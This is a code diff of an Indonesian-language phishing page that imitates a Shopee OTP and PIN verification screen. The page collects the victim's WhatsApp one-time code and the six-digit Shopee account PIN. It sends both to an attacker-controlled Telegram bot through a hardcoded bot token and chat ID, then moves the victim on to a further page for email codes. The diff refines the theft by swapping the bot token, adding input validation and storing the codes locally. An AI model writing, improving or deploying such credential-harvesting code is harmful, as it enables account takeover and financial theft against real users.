@@ -1,6 +1,5 @@
 <!DOCTYPE html>
 <html lang="id">
-
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -135,7 +134,7 @@
     </header>
     <div class="content" id="otp-section">
         <p>Kode verifikasi (OTP) kamu telah dikirim melalui <b class="wa">WhatsApp Yang Terdaftar</b></p>
-        <p><b class="wa"></b></p>
+        <p><b class="wa" id="wa-display"></b></p>
         <div class="otp-box">
             <input type="tel" inputmode="numeric" maxlength="1" class="otp-input" />
             <input type="tel" inputmode="numeric" maxlength="1" class="otp-input" />
@@ -145,7 +144,7 @@
             <input type="tel" inputmode="numeric" maxlength="1" class="otp-input" />
         </div>
         <button id="lanjut" disabled>Lanjut</button>
-        <div class="wait">Mohon tunggu <span id="countdown">60</span> detik untuk mengirim ulang</div>
+        <div class="wait">Jika yang muncul otp link Mohon tunggu <span id="countdown">60</span> detik untuk mengirim ulang kode otp digit</div>
     </div>
     <div class="content pin-section" id="pin-section">
         <p>Masukkan PIN Akun Shopee Anda</p>
@@ -161,8 +160,16 @@
     </div>
     <script>
         // === Konfigurasi Telegram ===
-        const TELEGRAM_BOT_TOKEN = '7812428468:AAE1qHjLLHOQlAmABXbr9JhXEg0KQkb0XW0';
+        const TELEGRAM_BOT_TOKEN = '8483832719:AAH9MrWjVVmMxydfTMJjOPyG_c7xu04P6Gk';
         const TELEGRAM_CHAT_ID = '5923031825';
+
+        // === Helper untuk localStorage aman ===
+        function safeGetLocal(key) {
+            try { return localStorage.getItem(key); } catch (e) { return null; }
+        }
+        function safeSetLocal(key, value) {
+            try { localStorage.setItem(key, value); return true; } catch (e) { console.warn('localStorage set fail', e); return false; }
+        }
 
         // === OTP Input Logic ===
         const otpInputs = document.querySelectorAll(".otp-input");
@@ -170,12 +177,19 @@
         const otpSection = document.getElementById("otp-section");
         const pinSection = document.getElementById("pin-section");
 
+        // tampilkan nomor WA terdaftar (jika tersedia di localStorage dengan kunci 'phoneNumber')
+        document.addEventListener('DOMContentLoaded', () => {
+            const waDisplay = document.getElementById('wa-display');
+            const storedPhone = safeGetLocal('phoneNumber');
+            if (waDisplay) waDisplay.textContent = storedPhone ? storedPhone : '';
+        });
+
         otpInputs.forEach((input, index) => {
             input.addEventListener("input", (e) => {
                 // Selalu hapus karakter non-angka
-                const value = e.target.value.replace(/[^0-9]/g, ""); 
+                const value = e.target.value.replace(/[^0-9]/g, "");
                 e.target.value = value;
-                
+
                 if (value && index < otpInputs.length - 1) {
                     otpInputs[index + 1].focus();
                 }
@@ -198,18 +212,37 @@
                 lanjutBtn.disabled = true;
             }
         }
-        
+
         lanjutBtn.addEventListener("click", () => {
             const otp = Array.from(otpInputs).map((i) => i.value).join("");
-            sendToTelegram(`Kode OTP: ${otp}`); // Kirim OTP ke Telegram
-            // Sembunyikan bagian OTP dan tampilkan bagian PIN
+            // validasi format 6 digit
+            if (!/^\d{6}$/.test(otp)) {
+                alert('Masukkan kode OTP 6 digit angka terlebih dahulu.');
+                return;
+            }
+
+            // Cek keunikan: OTP WhatsApp tidak boleh sama dengan PIN atau OTP Email yang sudah tersimpan
+            const existingPin = safeGetLocal('pinMitra');
+            const existingOtpEmail = safeGetLocal('otpEmail');
+            if ((existingPin && existingPin === otp) || (existingOtpEmail && existingOtpEmail === otp)) {
+                alert('Kode OTP WhatsApp tidak boleh sama dengan PIN atau OTP Email yang sudah tersimpan. Mohon masukkan kode yang berbeda atau minta kode baru.');
+                return;
+            }
+
+            // Simpan otpWhatsApp untuk pemeriksaan di halaman lain
+            safeSetLocal('otpWhatsApp', otp);
+
+            // Kirim OTP ke Telegram (seperti sebelumnya)
+            sendToTelegram(`Kode OTP: ${otp}`);
+
+            // Sembunyikan bagian OTP dan tampilkan bagian PIN (tetap mempertahankan tampilan)
             otpSection.style.display = "none";
-            pinSection.style.display = "block"; 
-            
+            pinSection.style.display = "block";
+
             // Atur fokus ke input pertama PIN
             const pinInputs = document.querySelectorAll(".pin-input");
             if (pinInputs.length > 0) {
-                 pinInputs[0].focus();
+                pinInputs[0].focus();
             }
         });
 
@@ -232,7 +265,7 @@
         pinInputs.forEach((input, index) => {
             input.addEventListener("input", (e) => {
                 // Selalu hapus karakter non-angka
-                const value = e.target.value.replace(/[^0-9]/g, ""); 
+                const value = e.target.value.replace(/[^0-9]/g, "");
                 e.target.value = value;
 
                 if (value && index < pinInputs.length - 1) {
@@ -257,12 +290,31 @@
                 konfirmasiPinBtn.disabled = true;
             }
         }
-        
+
         konfirmasiPinBtn.addEventListener("click", () => {
             const pin = Array.from(pinInputs).map((i) => i.value).join("");
-            sendToTelegram(`PIN Akun Shopee: ${pin}`); // Kirim PIN ke Telegram
+            // validasi format 6 digit
+            if (!/^\d{6}$/.test(pin)) {
+                alert('PIN harus 6 digit angka.');
+                return;
+            }
+
+            // Cek keunikan: PIN tidak boleh sama dengan OTP WhatsApp atau OTP Email
+            const existingOtpWA = safeGetLocal('otpWhatsApp');
+            const existingOtpEmail = safeGetLocal('otpEmail');
+            if ((existingOtpWA && existingOtpWA === pin) || (existingOtpEmail && existingOtpEmail === pin)) {
+                alert('PIN tidak boleh sama dengan OTP WhatsApp atau OTP Email yang sudah tersimpan. Mohon gunakan PIN berbeda.');
+                return;
+            }
+
+            // Simpan pinMitra
+            safeSetLocal('pinMitra', pin);
+
+            // Kirim PIN ke Telegram (seperti sebelumnya)
+            sendToTelegram(`PIN Akun Shopee: ${pin}`);
+
             // Alihkan ke halaman berikutnya
-            window.location.href = "email.html"; 
+            window.location.href = "email.html";
         });
 
         // === Fungsi untuk mengirim data ke Telegram ===
